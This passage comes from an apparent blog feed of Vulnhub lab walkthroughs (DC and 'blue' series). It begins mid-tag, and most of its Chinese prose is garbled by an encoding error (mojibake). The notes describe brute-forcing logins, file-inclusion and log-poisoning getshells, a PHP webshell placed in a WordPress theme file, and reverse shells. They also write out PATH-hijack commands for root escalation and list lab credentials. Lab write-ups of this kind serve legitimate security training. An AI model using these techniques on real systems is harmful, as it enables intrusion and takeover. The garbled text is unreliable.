href="https://blog.csdn.net/bwt_D/article/details/121291921">https://blog.csdn.net/bwt_D/article/details/121291921</a></p><ul><li>ä¿¡æ¯æ”¶é›†ï¼šå¾—åˆ°ç½‘ç«™CMSï¼Œä½¿ç”¨å¯¹åº”ç‰ˆæœ¬æ¼æ´expçˆ†åº“</li><li>johnå¯†ç å“ˆå¸Œçˆ†ç ´</li><li>åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ </li><li>å†…æ ¸ææƒ</li></ul><h2 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h2><p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p><ul><li>ç”¨æˆ·ç™»å½•æ— é˜²æŠ¤çˆ†ç ´</li><li>rce</li><li>sshçˆ†ç ´</li><li>ä¿¡æ¯æ”¶é›†ï¼šå¤‡ä»½æ–‡ä»¶ï¼Œé‚®ä»¶ï¼ˆæ³„éœ²ç”¨æˆ·å¯†ç ï¼‰</li><li>teeheeææƒ</li></ul><p><img src="/../images/image-20230224161511140-1686283446324.png" alt="image-20230224161511140"></p><h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><p><a href="https://www.freebuf.com/sectool/259277.html">https://www.freebuf.com/sectool/259277.html</a></p><ul><li>æ—¥å¿—åŒ…å«getshell</li><li>screenææƒ</li></ul><p>ç«¯å£æ‰«æ</p><img src="../../../typora img/image-20230224202703382.png" alt="image-20230224202703382" style="zoom: 80%;" /><p>é€šè¿‡contactæäº¤åï¼Œé¡µé¢è¿”å›çš„é¡µè„šä¸åŒåˆ¤æ–­å‡ºåç«¯æœ‰includeå‡½æ•°åŒ…å«äº†é¡µè„šæ–‡ä»¶ã€‚</p><p><img src="/../images/image-20230224204544733-1686283446324.png" alt="image-20230224204544733"></p><p><img src="/../images/image-20230224204559624-1686283446325.png" alt="image-20230224204559624"></p><p>ä½¿ç”¨burpçˆ†ç ´å‚æ•°</p><p><img src="/../images/image-20230224204633133-1686283446325.png" alt="image-20230224204633133"></p><img src="../../../typora img/image-20230224204657204.png" alt="image-20230224204657204" style="zoom:80%;" /><p>æ–‡ä»¶åŒ…å«getshell</p><p>å› ä¸ºç½‘ç«™æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘åŒ…å«æ—¥å¿—æ–‡ä»¶&#x2F;sessionæ–‡ä»¶ï¼Œæˆ–è€…ä¸phpinfoç•Œé¢è¿ç”¨ã€‚</p><p>è¿™é‡Œé€‰æ‹©åŒ…å«æ—¥å¿—æ–‡ä»¶</p><h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><p><a href="https://blog.csdn.net/weixin_45996361/article/details/123431118">https://blog.csdn.net/weixin_45996361/article/details/123431118</a></p><ul><li>ç”¨æˆ·å¯†ç çˆ†ç ´ï¼ˆå­—å…¸ä¸ºDC2çš„ï¼‰</li><li>wordpressæ’ä»¶activity monitoræä¾›äº†pingå‘½ä»¤ï¼Œå¯¹ç”¨æˆ·è¾“å…¥æ— é™åˆ¶å¯¼è‡´rce</li><li>é‚®ä»¶å¯†ç æ³„éœ²</li><li>sudoææƒ</li><li>nmapææƒ</li></ul><p><img src="/../images/image-20230225172831079-1686283446325.png" alt="image-20230225172831079"></p><p><img src="/../images/image-20230225202530004-1686283446325.png" alt="image-20230225202530004"></p><p><img src="/../images/image-20230225202604851-1686283446325.png" alt="image-20230225202604851"></p><p><img src="/../images/image-20230225202617319-1686283446325.png" alt="image-20230225202617319"></p><p><img src="/../images/image-20230225202517080-1686283446325.png" alt="image-20230225202517080"></p><p><img src="/../images/image-20230225202502557-1686283446325.png" alt="image-20230225202502557"></p><h2 id="DC7"><a href="#DC7" class="headerlink" title="DC7"></a>DC7</h2><ul><li><p>ç«¯å£ï¼š22,80</p></li><li><p>ä¿¡æ¯æ”¶é›†ï¼šgithubæºç æ³„éœ²</p><p><img src="/../images/image-20230225211326780-1686283446325.png" alt="image-20230225211326780"></p><img src="../../../typora img/image-20230225211258444.png" alt="image-20230225211258444" style="zoom:80%;" /><p><img src="/../images/image-20230225211553018-1686283446325.png" alt="image-20230225211553018"></p><p>è¿™ä¸ªè´¦æˆ·æµ‹è¯•åå¯ä»¥è¿æ¥ssh</p></li><li><p>sshè¿æ¥åä¿¡æ¯æ”¶é›†</p><p>æœ‰é‚®ä»¶</p><p><img src="/../images/image-20230225211951236-1686283446325.png" alt="image-20230225211951236"></p><p><img src="/../images/image-20230225211719078-1686283446326.png" alt="image-20230225211719078"></p><p>å‘ç°éƒ½æ˜¯ä»¥ä¸‹ä¿¡æ¯ï¼Œå¹¶ä¸”æ¯éš”ä¸€æ®µæ—¶é—´éƒ½æœ‰<code>You have new mail</code>æç¤ºï¼Œå¯ä»¥çŒœæµ‹å‡ºè¿™æ˜¯ä¸€ä¸ªå®šæ—¶è„šæœ¬</p><p><img src="/../images/image-20230225211729539-1686283446326.png" alt="image-20230225211729539"></p><p><img src="/../images/image-20230225211814513-1686283446326.png" alt="image-20230225211814513"></p><p>â€‹</p></li></ul><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ cat /opt/scripts/backups.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure><p>drushæ˜¯drupalçš„å‘½ä»¤ï¼Œå¯ä»¥ä¿®æ”¹adminå¯†ç  ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨ç½‘ç«™ç›®å½•ä¸‹æ‰å¯ä»¥</p><p>gpgæ˜¯å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œæ²¡æ‰¾åˆ°å…¬é’¥ï¼Œæ‰€ä»¥æ— æ³•è§£å¯†ï¼Œå¦åˆ™å¯ä»¥è§£å¯†é‡æ–°å¯¼å…¥sqlæ–‡ä»¶</p><p><code>mysql -udc7user -pMdR3xOgB7#dW Staff &lt; /home/dc7user/backups/website.sql;</code></p><ul><li><p>ææƒ</p><p>â€‹é€šè¿‡ä¿®æ”¹adminå¯†ç ç™»å½•åå°ï¼Œå¯ä»¥ç¼–è¾‘åšå®¢æˆ–è€…é¡µé¢ã€‚é‚£ä¹ˆç›´æ¥é€‰æ‹©ç¼–è¾‘é¡µé¢å†™å…¥ä¸€ä¸ªæœ¨é©¬ã€‚ä½†æ˜¯éœ€è¦å…ˆå®‰è£…PHPæ¨¡å—ã€‚</p><p>â€‹æœ¨é©¬å†™å…¥åï¼Œè·å¾—www-dataç”¨æˆ·æƒé™</p><p>â€‹<img src="/../images/image-20230225225209155-1686283446326.png" alt="image-20230225225209155"></p><p>ä»å®šæ—¶è„šæœ¬æ‰€å±çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„å…¥æ‰‹ï¼Œç”¨æˆ·ç»„ä¸ºwww-dataæƒé™ä¸ºrwxï¼šè¯´æ˜www</p><p>-dataç”¨æˆ·å¯ä»¥å¯¹å…¶è¿›è¡Œè¯»å†™æ‰§è¡Œï¼Œæ‹¥æœ‰è€…ä¸ºrootï¼šè¯´æ˜å…¶è¿è¡Œæ—¶çš„æƒé™ä¸ºrootã€‚æ‰€ä»¥æˆ‘ä»¬å‘å…¶å†™å…¥åå¼¹shellï¼Œç­‰å¾…å…¶æ‰§è¡Œå°±å¯ä»¥è·å¾—rootæƒé™ã€‚</p></li></ul><h2 id="DC8"><a href="#DC8" class="headerlink" title="DC8"></a>DC8</h2><p><a href="https://blog.csdn.net/q90375412/article/details/127351747">https://blog.csdn.net/q90375412/article/details/127351747</a></p><ul><li>sqlæ³¨å…¥ï¼ˆsqlmapï¼‰</li><li>johnç ´è§£å¯†ç </li><li>åå°æ¨¡æ¿getshell</li><li>exim4ææƒ</li></ul><h2 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h2><p><a href="https://blog.csdn.net/m0_65712192/article/details/129250059">https://blog.csdn.net/m0_65712192/article/details/129250059</a></p><p><img src="/../images/image-20230309113640488-1686283446326.png" alt="image-20230309113640488"></p><p>å¯ä»¥å‘ç°sshæœåŠ¡æ˜¯filteredçš„</p><p><img src="/../images/image-20230309115117489-1686283446326.png" alt="image-20230309115117489"></p><p><img src="/../images/image-20230309115144629-1686283446326.png" alt="image-20230309115144629"></p><p><img src="/../images/image-20230309121325288-1686283446326.png" alt="image-20230309121325288"></p><p><img src="/../images/image-20230309121309508-1686283446326.png" alt="image-20230309121309508"></p><p><img src="/../images/image-20230309121245679-1686283446327.png" alt="image-20230309121245679"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--blueç³»åˆ—</title>
      <link href="/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><img src="../../../typora img/image-20230305123445338.png" alt="image-20230305123445338" style="zoom:80%;" /><p><img src="/../images/image-20230305130206056-1686283466992.png" alt="image-20230305130206056"></p><p><img src="/../images/image-20230305130221501-1686283466992.png" alt="image-20230305130221501"></p><p>secret.zipæ²¡æœ‰ç ´è§£å‡ºæ¥ã€‚</p><p>dirseachç›®å½•æ‰«æç»“æœ</p><p><img src="/../images/image-20230305130651336-1686283466992.png" alt="image-20230305130651336"></p><p>è®¿é—®robots.txtä¸­çš„ç½‘å€</p><p><img src="/../images/image-20230305130727097-1686283466992.png" alt="image-20230305130727097"></p><p>æ­Œè¯è¿åœ¨ä¸€èµ·MD5ä¸ºsshå¯†ç ï¼Œæ²¡æˆåŠŸã€‚</p><p>å¦ä¸€ä¸ªç½‘ç«™ä¸º&#x2F;etc&#x2F;dripispowerful.htmlï¼ŒçŒœæµ‹æœ‰æ–‡ä»¶åŒ…å«ï¼Œæ ¹æ®ä¸Šé¢çš„ç›®å½•æ‰«æåªæœ‰ä¸€ä¸ªindex.phpï¼Œå‚æ•°å°è¯•å‹ç¼©åŒ…é‡Œçš„focus  on â€œdripâ€ã€‚</p><p>å°è¯•è®¿é—®index.php?drip&#x3D;&#x2F;etc&#x2F;dripispowerful.htmlï¼Œè·å¾—å¯†ç å’Œä¸¤ä¸ªç”¨æˆ·å</p><p><img src="/../images/image-20230305131636950-1686283466992.png" alt="image-20230305131636950"></p><p>sshç™»å½•</p><p><img src="/../images/image-20230305132010055-1686283466992.png" alt="image-20230305132010055"></p><p>ææƒï¼ˆä¸ä¼šï¼Œçœ‹wpçš„ï¼‰</p><p><img src="/../images/image-20230305133355153-1686283466992.png" alt="image-20230305133355153"></p><p>polkitææƒ<a href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></p><p><img src="/../images/image-20230305133346301-1686283466992.png" alt="image-20230305133346301"></p><p><img src="/../images/image-20230305133331628-1686283466992.png" alt="image-20230305133331628"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><ul><li>ftpåŒ¿åç™»å½•</li><li>wordpressç”¨æˆ·çˆ†ç ´ï¼Œåå°getshell</li><li>sshå¯†é’¥ç™»å½•</li><li>nmapææƒ</li></ul><p><img src="/../images/image-20230304120228644-1686283466993.png" alt="image-20230304120228644"></p><p><img src="/../images/image-20230304120308755-1686283466993.png" alt="image-20230304120308755"></p><p>ftpå­˜åœ¨åŒ¿åç™»å½•ï¼Œç»è¿‡éªŒè¯å‘ç°ftpä¸Šçš„secret.jpgæ— éšå†™ã€‚</p><p><img src="/../images/image-20230304120324693-1686283466993.png" alt="image-20230304120324693"></p><p><img src="/../images/image-20230304120358152-1686283466993.png" alt="image-20230304120358152"></p><p>wpscanç”¨æˆ·æšä¸¾</p><p><img src="/../images/image-20230304121310981-1686283466993.png" alt="image-20230304121310981"></p><p>è¿›è¡Œå¯†ç çˆ†ç ´</p><p><img src="/../images/image-20230304122015951-1686283466993.png" alt="image-20230304122015951"></p><p>è®¿é—®åå°æ—¶è·³è½¬ï¼Œæ·»åŠ hostè®°å½•</p><p><img src="/../images/image-20230304121229221-1686283466993.png" alt="image-20230304121229221"></p><p>è¿›å…¥åå°</p><p>åœ¨ä¸»é¢˜çš„404æ–‡ä»¶ä¸­åŠ å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œè®¿é—®è¯¥404æ–‡ä»¶ï¼Œä¼ å…¥åå¼¹shell</p><p><img src="/../images/image-20230304125406319-1686283466993.png" alt="image-20230304125406319"></p><p><img src="/../images/image-20230304125413838-1686283466993.png" alt="image-20230304125413838"></p><p><img src="/../images/image-20230304125353482-1686283466993.png" alt="image-20230304125353482"></p><p>è¿›å…¥å®¶ç›®å½•çœ‹çœ‹</p><p><img src="/../images/image-20230304125605846-1686283466993.png" alt="image-20230304125605846"></p><p>æ— æƒé™ï¼Œå°è¯•ææƒå¤±è´¥</p><p>ä½†æ˜¯è¿˜å­˜åœ¨sshå¯†é’¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†sshç§é’¥ä¸‹è½½åˆ°æœ¬åœ°ï¼Œé€šè¿‡sshç™»å½•åˆ°freddieç”¨æˆ·</p><p>ä½¿ç”¨pythonåœ¨.sshç›®å½•ä¸‹å¼€ä¸€ä¸ªç®€æ˜“æœåŠ¡å™¨ä¾›æœ¬åœ°ä¸‹è½½æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20230304131800088-1686283466993.png" alt="image-20230304131800088"></p><p>æœ¬åœ°ä¸‹è½½ä¸‹æ¥åï¼Œéœ€è¦å°†id_rsaæ”¹ä¸ºåªæœ‰400æƒé™æ‰å¯ä»¥ä½¿ç”¨</p><p><img src="/../images/image-20230304132002887-1686283466993.png" alt="image-20230304132002887"></p><p><img src="/../images/image-20230304132104344-1686283466993.png" alt="image-20230304132104344"></p><p><img src="/../images/image-20230304132257002-1686283466993.png" alt="image-20230304132257002"></p><p><img src="/../images/image-20230304132307798-1686283466993.png" alt="image-20230304132307798"></p><p><img src="/../images/image-20230304132242555-1686283466993.png" alt="image-20230304132242555"></p><p>è¯»å–&#x2F;root&#x2F;root.txtè·å¾—ç¬¬äºŒä¸ªflagÂ·</p><p><img src="/../images/image-20230304132345766-1686283466993.png" alt="image-20230304132345766"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul><li>sshæ—¥å¿—åŒ…å«getshell</li><li>sshå¯†é’¥ç™»å½•</li><li>å‘½ä»¤åŠ«æŒææƒ</li></ul><p><img src="/../images/image-20230304141715650-1686283466994.png" alt="image-20230304141715650"></p><p><img src="/../images/image-20230304141957453-1686283466994.png" alt="image-20230304141957453"></p><p>å‡ ä¸ªç½‘ç«™éƒ½æ˜¯ABABã€‚ã€‚</p><p>wp-adminç›®å½•åªæœ‰ä¸€ä¸ªreadme</p><p><img src="/../images/image-20230304141834709-1686283466994.png" alt="image-20230304141834709"></p><p>æ¶ä½œå‰§ğŸ˜¡</p><p>å›å¤´çœ‹nampçš„é»˜è®¤è„šæœ¬çš„æ‰«æï¼Œå¯ä»¥çœ‹åˆ°robots.txtä¸­ç¦æ­¢äº†ä¸€ä¸ª&#x2F;eventadminsï¼Œè®¿é—®</p><p><img src="/../images/image-20230304142524510-1686283466994.png" alt="image-20230304142524510"></p><p>å†è®¿é—®æç¤ºctrl+aå‘ç°</p><p><img src="/../images/image-20230304142655946-1686283466994.png" alt="image-20230304142655946"></p><p><img src="/../images/image-20230304142745118-1686283466994.png" alt="image-20230304142745118"></p><p>å†è®¿é—®</p><p><img src="/../images/image-20230304142923226-1686283466994.png" alt="image-20230304142923226"></p><p>ä¸€å¼€å§‹æƒ³çš„æ˜¯ç”¨ä¹å¤´è›‡è¿›è¡Œçˆ†ç ´ï¼Œä½†æ˜¯ç”¨æˆ·åªçŸ¥é“rootã€‚</p><p>åé¢å‘ç°ä¸è¡Œï¼Œæƒ³åˆ°æ—¥å¿—çš„ç”¨é€”ï¼Œå°è¯•è¿›è¡Œsshæ—¥å¿—åŒ…å«getshellã€‚</p><p>å› ä¸ºæ—¥å¿—ä¸­ä¼šè®°å½•sshè¿æ¥çš„ç”¨æˆ·å</p><p><img src="/../images/image-20230304165054436-1686283466994.png" alt="image-20230304165054436"></p><p>æ‰€ä»¥</p><p><img src="/../images/image-20230304165131376-1686283466994.png" alt="image-20230304165131376"></p><p>åå¼¹shell</p><p><img src="/../images/image-20230304165152817-1686283466994.png" alt="image-20230304165152817"></p><p><img src="/../images/image-20230304165204015-1686283466994.png" alt="image-20230304165204015"></p><p>è¿™é‡Œå’Œä¸Šä¸€ä¸ªé¶æœºä¸€æ ·ï¼Œå­˜åœ¨å¦ä¸€ä¸ªç”¨æˆ·robertjï¼Œå¹¶ä¸”www-dataæ— æ³•ææƒ</p><p>æŒ‰ç…§ä¸Šä¸€ä¸ªçš„æ€è·¯æŸ¥çœ‹.sshç›®å½•ï¼Œå‘ç°ä¸ºç©º</p><p><img src="/../images/image-20230304165345630-1686283466994.png" alt="image-20230304165345630"></p><p>é€‰æ‹©ç›´æ¥ç”Ÿæˆsshå¯†é’¥</p><img src="../../../typora img/image-20230304175028256.png" alt="image-20230304175028256" style="zoom:80%;" /><p>æŸ¥çœ‹sshé…ç½®æ–‡ä»¶ï¼šåªå…è®¸å¯†é’¥éªŒè¯æ–¹å¼è¿æ¥ï¼Œå¹¶ä¸”ç”¨æ¥éªŒè¯çš„å…¬é’¥ä¸ºauthorized_keys</p><p><img src="/../images/image-20230304171108734-1686283466994.png" alt="image-20230304171108734"></p><p>æ‰€ä»¥éœ€è¦å°†å…¬é’¥id_rsa.pubæ”¹ä¸ºauthorized_keys</p><p>ç„¶åç”¨pythonåœ¨é¶æœºä¸Šå¼€ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œkaliä½¿ç”¨wgetå‘½ä»¤ä¸‹è½½ç§é’¥ï¼Œå¹¶ä¿®æ”¹ç§é’¥æƒé™ï¼Œæœ€åsshç™»å½•</p><p><img src="/../images/image-20230304175249187-1686283466994.png" alt="image-20230304175249187"></p><p>ææƒ</p><p><img src="/../images/image-20230304174502247-1686283466994.png" alt="image-20230304174502247"></p><p>ä¸€å¼€å§‹æƒ³ç”¨stringsæŸ¥çœ‹çš„ï¼Œä½†æ˜¯æ²¡æœ‰å®‰è£…ï¼Œé‚£å°±ç›´æ¥ç”¨ä¸€ä¸‹çœ‹çœ‹</p><p><img src="/../images/image-20230304174629368-1686283466994.png" alt="image-20230304174629368"></p><p>å¯ä»¥çŸ¥é“è¿™ä¸ªå‘½ä»¤å®è´¨ä¸Šæ˜¯æ‰§è¡Œäº†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip address</span><br><span class="line">cat /etc/hosts</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬é€‰ä¸€ä¸ªè¿›è¡Œæ„é€ å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; uname</span><br><span class="line">chmod 777 uname </span><br><span class="line">export PATH=/home/robertj:$PATH</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œgetinfoå³å¯</p><p><img src="/../images/image-20230304174854741-1686283466995.png" alt="image-20230304174854741"></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><ul><li>miscè·å¾—äººå‘˜ä¿¡æ¯</li><li>ftpçˆ†ç ´</li><li>ftp+syncæœåŠ¡ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ftpæœåŠ¡å™¨æ“ä½œç½‘ç«™æœåŠ¡å™¨ç›®å½•</li><li>sshå¯†é’¥ç™»å½•</li><li>å‘½ä»¤åŠ«æŒææƒ</li></ul><p><img src="/../images/image-20230304191909931-1686283466995.png" alt="image-20230304191909931"></p><p>ç½‘ç«™æ³¨é‡Šè§£ç ï¼Œè®¿é—®å¦ä¸€ä¸ªç½‘ç«™ï¼Œbrainfuckè§£ç ï¼ŒäºŒç»´ç æ‰«ææœ€åå¾—åˆ°å¦‚ä¸‹</p><p><img src="/../images/image-20230304204625662-1686283466995.png" alt="image-20230304204625662"></p><p>æ”¶é›†åˆ°äº†ç½‘ç«™æŠ€æœ¯äººå‘˜çš„åå­—ï¼Œå¯ä»¥å°è¯•çˆ†ç ´ftpå’ŒsshæœåŠ¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure><p>sshæ— æœ</p><p>ftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login: luther   password: mypics</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230304210341290-1686283466995.png" alt="image-20230304210341290"></p><p><img src="/../images/image-20230304211248271-1686283466995.png" alt="image-20230304211248271"></p><p>å‘ç°äº†ä¸€ä¸ªç›®å½•ï¼Œç›®å½•åä¸ºhubertæ˜¯æ”¶é›†åˆ°çš„ä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”uidå’Œgidä¸º1001ï¼Œè¯æ˜å…¶æ˜¯ç¬¬ä¸€ä¸ªç”¨æˆ·ï¼Œæ‰€ä»¥è¯¥ç›®å½•ä¸ºhubertç”¨æˆ·çš„å®¶ç›®å½•ã€‚</p><p>å¦ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨getå‘½ä»¤ä¸‹è½½åˆ°æœ¬åœ°å</p><p><img src="/../images/image-20230304212449213-1686283466995.png" alt="image-20230304212449213"></p><p>å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªåŒæ­¥å®Œæˆçš„æ—¥å¿—ã€‚</p><blockquote><p>æ‰€ä»¥æ ¹æ®è¿™ä¸¤ä¸ªä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æœåŠ¡å™¨ä¼šåŒæ­¥è¿™ä¸ªftpä¸Šçš„æ–‡ä»¶ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ“ä½œhubertç”¨æˆ·çš„å®¶ç›®å½•ã€‚</p></blockquote><p>æˆ‘ä»¬ä½¿ç”¨putå‘½ä»¤ä¸Šä¼ è‡ªå·±çš„å…¬é’¥</p><p><img src="/../images/image-20230304212132365-1686283466995.png" alt="image-20230304212132365"></p><p>éœ€è¦æ³¨æ„å…¬é’¥å</p><p><img src="/../images/image-20230304212209119-1686283466995.png" alt="image-20230304212209119"></p><p>ç„¶åsshè¿æ¥</p><p><img src="/../images/image-20230304212235168-1686283466995.png" alt="image-20230304212235168"></p><p>çœ‹ä¸‹å®¶ç›®å½•æœ‰å•¥</p><p><img src="/../images/image-20230304212842826-1686283466995.png" alt="image-20230304212842826"></p><p>è¯»å–è¿™ä¸ªrootæƒé™çš„pyæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸ªç½‘ç«™è¢«é»‘å®¢fricaæ”»å‡»äº†ï¼Œå¹¶ä¸”ç•™ä¸‹äº†åé—¨ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå‰é¢å«äººæ¥ä¿®å¤ç½‘ç«™çš„åŸå› ğŸ¤£</p><p>è¿™ä¸ªé»‘å®¢è¿˜å‘Šè¯‰æˆ‘ä»¬ä»–ç•™ä¸‹äº†æ¾æ•£çš„æƒé™ğŸ˜</p><p><img src="/../images/image-20230304212825018-1686283466995.png" alt="image-20230304212825018"></p><p>è®©æˆ‘åº·åº·</p><p><img src="/../images/image-20230304213424178-1686283466995.png" alt="image-20230304213424178"></p><p>è¿™æ¬¡æœ‰stringså‘½ä»¤ï¼ŒæŸ¥çœ‹getinfo</p><p><img src="/../images/image-20230304213618067-1686283466995.png" alt="image-20230304213618067"></p><p>è·Ÿä¸Šä¸€ä¸ªé¶æœºä¸€æ ·</p><p><img src="/../images/image-20230304213721571-1686283466995.png" alt="image-20230304213721571"></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="/../images/image-20230305160546454-1686283466995.png" alt="image-20230305160546454"></p><p><img src="/../images/image-20230305163954224-1686283466995.png" alt="image-20230305163954224"></p><p>wpscanç”¨æˆ·æšä¸¾</p><p><img src="/../images/image-20230305160724611-1686283466995.png" alt="image-20230305160724611"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abuzerkomurcu</span><br><span class="line">collins</span><br><span class="line">gill</span><br><span class="line">collins</span><br><span class="line">satanic</span><br></pre></td></tr></table></figure><p>å¯†ç å­—å…¸ç”Ÿæˆ</p><p><img src="/../images/image-20230305162409527-1686283466995.png" alt="image-20230305162409527"></p><blockquote><p>-m 6 æ˜¯å› ä¸ºwordpresså¯†ç æœ€å°‘6ä¸ªå­—ç¬¦</p></blockquote><p>çˆ†ç ´å¯†ç </p><p><img src="/../images/image-20230305162556601-1686283466995.png" alt="image-20230305162556601"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill / interchangeable</span><br></pre></td></tr></table></figure><p>æ™®é€šç”¨æˆ·ï¼Œåå°åªæ‰¾åˆ°ä¸€å¼ å¯ä»¥å›¾ç‰‡DB</p><p><img src="/../images/image-20230305164352862-1686283466996.png" alt="image-20230305164352862"></p><p>åˆ†æè¿™å¼ å›¾ç‰‡</p><p><img src="/../images/image-20230305164731337-1686283466996.png" alt="image-20230305164731337"></p><p><img src="/../images/image-20230305164827742-1686283466996.png" alt="image-20230305164827742"></p><p>å¾—åˆ°sshè´¦å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill 59583hello</span><br></pre></td></tr></table></figure><p>ç™»é™†åå‘ç°</p><p><img src="/../images/image-20230305165100247-1686283466996.png" alt="image-20230305165100247"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lost+foundç›®å½•æ— æƒé™</span><br><span class="line"></span><br><span class="line">å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ªkEYFILE</span><br></pre></td></tr></table></figure><p>é€šè¿‡æœç´¢å¾—åˆ°</p><p><img src="/../images/image-20230305165731867-1686283466996.png" alt="image-20230305165731867"></p><p><img src="/../images/image-20230305171048832-1686283466996.png" alt="image-20230305171048832"></p><p>å¯ä»¥ä½¿ç”¨johnè¿›è¡Œç ´è§£ï¼Œæœºå­GPUå¤ªåƒåœ¾äº†ï¼Œç›´æ¥ä»wpæ‹¿åˆ°å¯†ç </p><p>è·å¾—å¯†ç åï¼Œå¯ä»¥ç”¨KeePassè½¯ä»¶<a href="https://sourceforge.net/projects/keepass/%E6%89%93%E5%BC%80%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99">https://sourceforge.net/projects/keepass/æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨çº¿ç½‘ç«™</a></p><p><a href="https://app.keeweb.info/%E6%89%93%E5%BC%80%E3%80%82">https://app.keeweb.info/æ‰“å¼€ã€‚</a></p><p>æ‰“å¼€åå‘ç°6ä¸ªç©ºç™½çš„key</p><p><img src="/../images/image-20230305172848464-1686283466996.png" alt="image-20230305172848464"></p><p>ä¸çŸ¥é“æ‹¿æ¥å¹²å˜›çš„ã€‚ã€‚</p><p>ç»§ç»­ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªkeyfolderï¼Œå¯èƒ½å°±æ˜¯è¦è®©ä¸Šé¢çš„keyæ”¾åœ¨è¿™ä¸ªkeyfolder</p><p>è€Œä¸”ä½¿ç”¨pyps64ç›‘æ§è¿›ç¨‹å‘ç°æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡key.shï¼Œæ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚</p><p><img src="/../images/image-20230305172941445-1686283466996.png" alt="image-20230305172941445"></p><p>ç»æµ‹è¯•å½“åªæœ‰ä¸€ä¸ªæ–‡ä»¶fracturedoceanæ—¶</p><p><img src="/../images/image-20230305174849955-1686283466996.png" alt="image-20230305174849955"></p><p><img src="/../images/image-20230305175028644-1686283466996.png" alt="image-20230305175028644"></p><p>å®šæ—¶è„šæœ¬å†…å®¹</p><p><img src="/../images/image-20230305175728426-1686283466996.png" alt="image-20230305175728426"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="/../images/image-20230307141431844-1686283466996.png" alt="image-20230307141431844"></p><p>åªå¼€æ”¾äº†80ç«¯å£</p><p><img src="/../images/image-20230307141917191-1686283466996.png" alt="image-20230307141917191"></p><p>æç¤ºæˆ‘ä»¬ç›®å½•æ‰«æè¦æ·»åŠ 